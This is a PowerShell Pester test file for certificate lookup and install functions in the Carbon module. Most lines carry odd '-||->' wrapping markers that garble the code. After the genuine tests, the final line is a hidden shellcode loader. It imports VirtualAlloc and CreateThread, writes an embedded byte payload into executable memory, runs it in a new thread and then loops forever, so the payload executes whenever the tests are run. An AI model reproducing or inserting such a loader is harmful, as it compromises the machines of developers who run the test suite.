











 -||-> $TestCertPath =  -||-> JOin-Path -Path $PSScriptRoot -ChildPath 'Certificates\CarbonTestCertificate.cer' -Resolve <-||-  <-||- 
 -||-> $TestCert =  -||-> New-Object Security.Cryptography.X509Certificates.X509Certificate2 $TestCertPath <-||-  <-||- 
 -||-> $testCertificateThumbprint = '7D5CE4A8A5EC059B829ED135E9AD8607977691CC' <-||- 
 -||-> $testCertFriendlyName = 'Pup Test Certificate' <-||- 
 -||-> $testCertCertProviderPath = 'cert:\CurrentUser\My\{0}' -f $testCertificateThumbprint <-||- 

 -||-> & ( -||-> Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve <-||- ) <-||- 

 -||-> function Assert-TestCert
{
    param(
        $actualCert
    )
        
     -||-> $actualCert | Should Not BeNullOrEmpty <-||- 
     -||-> $actualCert.Thumbprint | Should Be $TestCert.Thumbprint <-||- 
} <-||- 

 -||-> function Init
{
     -||-> $Global:Error.Clear() <-||- 
     -||-> if(  -||-> -not ( -||-> Get-Certificate -Thumbprint $TestCert.Thumbprint -StoreLocation CurrentUser -StoreName My <-||- ) <-||-  ) 
    {
         -||-> Install-Certificate -Path $TestCertPath -StoreLocation CurrentUser -StoreName My <-||- 
    } <-||- 
} <-||- 

 -||-> Describe 'Get-Certificate.when getting certificate from a file' {
     -||-> Init <-||- 
     -||-> $cert =  -||-> Get-CCertificate -Path $TestCertPath <-||-  <-||- 
     -||-> It ( -||-> 'should have Path property' <-||- ) {
         -||-> $cert.Path | Should -Be $TestCertPath <-||- 
    } <-||- 
} <-||- 

 -||-> Describe 'Get-Certificate.when getting certificate by path from certificate store' {
     -||-> Init <-||- 
     -||-> $cert =  -||-> Get-CCertificate -Path $testCertCertProviderPath <-||-  <-||- 
     -||-> It ( -||-> 'should have Path property' <-||- ) {
         -||-> $cert.Path | Should -Be $testCertCertProviderPath <-||- 
    } <-||- 
} <-||- 

 -||-> Describe 'Get-Certificate.when getting certificate by thumbprint' {
     -||-> Init <-||- 
     -||-> $cert =  -||-> Get-CCertificate -Thumbprint $testCertificateThumbprint -StoreLocation CurrentUser -StoreName My <-||-  <-||- 
     -||-> It ( -||-> 'should have Path property' <-||- ) {
         -||-> $cert.Path | Should -Be $testCertCertProviderPath <-||- 
    } <-||- 
} <-||- 

 -||-> Describe 'Get-Certificate.when getting certificate by friendly name' {
     -||-> Init <-||- 
     -||-> $cert =  -||-> Get-CCertificate -FriendlyName $testCertFriendlyName -StoreLocation CurrentUser -StoreName My <-||-  <-||- 
     -||-> It ( -||-> 'should have Path property' <-||- ) {
         -||-> $cert.Path | Should -Be $testCertCertProviderPath <-||- 
    } <-||- 
} <-||- 

 -||-> Describe 'Get-Certificate' {
     -||-> It 'should find certificates by friendly name' {
         -||-> Init <-||- 
         -||-> $cert =  -||-> Get-Certificate -FriendlyName $TestCert.friendlyName -StoreLocation CurrentUser -StoreName My <-||-  <-||- 
         -||-> Assert-TestCert $cert <-||- 
    } <-||- 
    
    
     -||-> It 'should find certificate by path' {
         -||-> Init <-||- 
         -||-> $cert =  -||-> Get-Certificate -Path $TestCertPath <-||-  <-||- 
         -||-> Assert-TestCert $cert <-||- 
    } <-||- 
    
     -||-> It 'should find certificate by relative path' {
         -||-> Init <-||- 
         -||-> Push-Location -Path $PSScriptRoot <-||- 
         -||-> try
        {
             -||-> $cert =  -||-> Get-Certificate -Path ( -||-> '.\Certificates\{0}' -f ( -||-> Split-Path -Leaf -Path $TestCertPath <-||- ) <-||- ) <-||-  <-||- 
             -||-> Assert-TestCert $cert <-||- 
        }
        finally
        {
             -||-> Pop-Location <-||- 
        } <-||- 
    } <-||- 
    
     -||-> It 'should find certificate by thumbprint' {
         -||-> Init <-||- 
         -||-> $cert =  -||-> Get-Certificate -Thumbprint $TestCert.Thumbprint -StoreLocation CurrentUser -StoreName My <-||-  <-||- 
         -||-> Assert-TestCert $cert <-||- 
    } <-||- 
    
     -||-> It 'should not throw error when certificate does not exist' {
         -||-> Init <-||- 
         -||-> $cert =  -||-> Get-Certificate -Thumbprint '1234567890abcdef1234567890abcdef12345678' -StoreLocation CurrentUser -StoreName My -ErrorAction SilentlyContinue <-||-  <-||- 
         -||-> $Global:Error.Count | Should Be 0 <-||- 
         -||-> $cert | Should BeNullOrEmpty <-||- 
    } <-||- 
    
     -||-> It 'should find certificate in custom store by thumbprint' {
         -||-> Init <-||- 
         -||-> $expectedCert =  -||-> Install-Certificate -Path $TestCertPath -StoreLocation CurrentUser -CustomStoreName 'Carbon' <-||-  <-||- 
         -||-> try
        {
             -||-> $cert =  -||-> Get-Certificate -Thumbprint $expectedCert.Thumbprint -StoreLocation CurrentUser -CustomStoreName 'Carbon' <-||-  <-||- 
             -||-> $cert | Should Not BeNullOrEmpty <-||- 
             -||-> $cert.Thumbprint | Should Be $expectedCert.Thumbprint <-||- 
        }
        finally
        {
             -||-> Uninstall-Certificate -Certificate $expectedCert -StoreLocation CurrentUser -CustomStoreName 'Carbon' <-||- 
        } <-||- 
    } <-||- 
    
     -||-> It 'should find certificate in custom store by friendly name' {
         -||-> Init <-||- 
         -||-> $expectedCert =  -||-> Install-Certificate -Path $TestCertPath -StoreLocation CurrentUser -CustomStoreName 'Carbon' <-||-  <-||- 
         -||-> try
        {
             -||-> $cert =  -||-> Get-Certificate -FriendlyName $expectedCert.FriendlyName -StoreLocation CurrentUser -CustomStoreName 'Carbon' <-||-  <-||- 
             -||-> $cert | Should Not BeNullOrEmpty <-||- 
             -||-> $cert.Thumbprint | Should Be $expectedCert.Thumbprint <-||- 
        }
        finally
        {
             -||-> Uninstall-Certificate -Certificate $expectedCert -StoreLocation CurrentUser -CustomStoreName 'Carbon' <-||- 
        } <-||- 
    } <-||- 
    
     -||-> It 'should get password protected certificate' {
         -||-> Init <-||- 
         -||-> [Security.Cryptography.X509Certificates.X509Certificate2]$cert =  -||-> Get-Certificate -Path ( -||-> Join-Path -Path $PSScriptRoot -ChildPath 'Certificates\CarbonTestCertificateWithPassword.cer' <-||- ) -Password 'password' <-||-  <-||- 
         -||-> $Global:Error.Count | Should Be 0 <-||- 
         -||-> $cert | Should Not BeNullOrEmpty <-||- 
         -||-> $cert.Thumbprint | Should Be 'DE32D78122C2B5136221DE51B33A2F65A98351D2' <-||- 
         -||-> $cert.FriendlyName | Should Be 'Carbon Test Certificate - Password Protected' <-||- 
    } <-||- 
    
     -||-> It 'should include exception when failing to load certificate' {
         -||-> Init <-||- 
         -||-> $cert =  -||-> Get-Certificate -Path ( -||-> Join-Path -Path $PSScriptRoot -ChildPath 'Certificates\CarbonTestCertificateWithPassword.cer' <-||- ) -ErrorAction SilentlyContinue <-||-  <-||- 
         -||-> $Global:Error.Count | Should BeGreaterThan 0 <-||- 
         -||-> $Global:Error[0] | Should Match 'password' <-||- 
         -||-> $cert | Should BeNullOrEmpty <-||- 
         -||-> $Error[1].Exception | Should Not BeNullOrEmpty <-||- 
         -||-> $Error[1].Exception | Should BeOfType ( -||-> [Management.Automation.MethodInvocationException] <-||- ) <-||- 
    } <-||- 
    
     -||-> It 'should get certificates in CA store' {
         -||-> Init <-||- 
         -||-> $foundACert = $false <-||- 
         -||-> dir Cert:\CurrentUser\CA | ForEach-Object {
             -||-> $cert =  -||-> Get-Certificate -Thumbprint $_.Thumbprint -StoreLocation CurrentUser -StoreName CertificateAuthority <-||-  <-||- 
             -||-> $cert | Should Not BeNullOrEmpty <-||- 
             -||-> $foundACert = $true <-||- 
        } <-||- 
    } <-||-     
} <-||- 

 -||-> Uninstall-Certificate -Certificate $TestCert -storeLocation CurrentUser -StoreName My <-||- 

 -||-> $FrO7 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $FrO7 -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xc3,0xd9,0x74,0x24,0xf4,0x5a,0xbe,0x09,0x93,0xda,0xf4,0x2b,0xc9,0xb1,0x59,0x31,0x72,0x17,0x03,0x72,0x17,0x83,0xcb,0x97,0x38,0x01,0x37,0x7f,0x3e,0xea,0xc7,0x80,0x5f,0x62,0x22,0xb1,0x5f,0x10,0x27,0xe2,0x6f,0x52,0x65,0x0f,0x1b,0x36,0x9d,0x84,0x69,0x9f,0x92,0x2d,0xc7,0xf9,0x9d,0xae,0x74,0x39,0xbc,0x2c,0x87,0x6e,0x1e,0x0c,0x48,0x63,0x5f,0x49,0xb5,0x8e,0x0d,0x02,0xb1,0x3d,0xa1,0x27,0x8f,0xfd,0x4a,0x7b,0x01,0x86,0xaf,0xcc,0x20,0xa7,0x7e,0x46,0x7b,0x67,0x81,0x8b,0xf7,0x2e,0x99,0xc8,0x32,0xf8,0x12,0x3a,0xc8,0xfb,0xf2,0x72,0x31,0x57,0x3b,0xbb,0xc0,0xa9,0x7c,0x7c,0x3b,0xdc,0x74,0x7e,0xc6,0xe7,0x43,0xfc,0x1c,0x6d,0x57,0xa6,0xd7,0xd5,0xb3,0x56,0x3b,0x83,0x30,0x54,0xf0,0xc7,0x1e,0x79,0x07,0x0b,0x15,0x85,0x8c,0xaa,0xf9,0x0f,0xd6,0x88,0xdd,0x54,0x8c,0xb1,0x44,0x31,0x63,0xcd,0x96,0x9a,0xdc,0x6b,0xdd,0x37,0x08,0x06,0xbc,0x5f,0xa0,0x7c,0x4a,0xa0,0x54,0x08,0xdb,0xce,0xcd,0xa2,0x73,0x43,0x79,0x6d,0x84,0xa4,0x50,0x40,0x51,0x09,0x08,0xf0,0x36,0xfd,0xc6,0xcc,0xee,0x78,0xb0,0xce,0xdb,0x28,0xed,0x5a,0xe0,0x9d,0x42,0xf3,0xba,0x30,0x65,0x03,0xaa,0xbf,0x65,0x03,0x2a,0xef,0x27,0x59,0x6c,0xac,0x90,0x5d,0x20,0x5a,0x88,0xd4,0x5f,0x5c,0xc9,0x32,0xd6,0xa7,0x65,0xd5,0xe8,0x15,0x6a,0xa1,0xbb,0x0a,0x39,0xfd,0x68,0xfb,0xd5,0xea,0xdb,0x2d,0x1d,0x12,0x36,0xa7,0x0b,0xe6,0xe7,0xa0,0x4b,0xc5,0x17,0x31,0xc5,0xca,0x7d,0x35,0x85,0x60,0x9e,0x63,0x4d,0x00,0xe6,0x15,0x0b,0x15,0x33,0x7a,0x47,0xb9,0xe8,0x2b,0x0f,0x10,0x08,0xcc,0xb4,0x95,0xc1,0x69,0x8a,0x1f,0xe3,0x3e,0x7e,0x39,0x9b,0x30,0x35,0x1b,0x0d,0x4e,0xe3,0x36,0xf1,0xd8,0x0c,0xd7,0xf1,0x18,0x65,0xd7,0xf1,0x58,0x75,0x84,0x99,0x00,0xd1,0x79,0xbc,0x4e,0xcc,0xed,0x6d,0xe2,0x66,0xf6,0xc6,0x6c,0x79,0xd9,0xe8,0x6c,0x2a,0x4f,0x80,0x7e,0x5a,0xe6,0xb2,0x80,0xb7,0x7c,0xf2,0x0b,0xf5,0xf4,0xf5,0xf2,0xc6,0x8e,0x39,0x81,0x2d,0xc8,0x7a,0x35,0x46,0x9c,0x83,0x35,0x69,0x2c,0x0b,0xa3,0xf8,0xa7,0x84,0x5c,0x69,0x25,0x33,0xc7,0x5f,0xd1,0xa7,0x69,0xd3,0x37,0x49,0x13,0x67,0x48 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $Y4g3=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $Y4g3.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$Y4g3,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



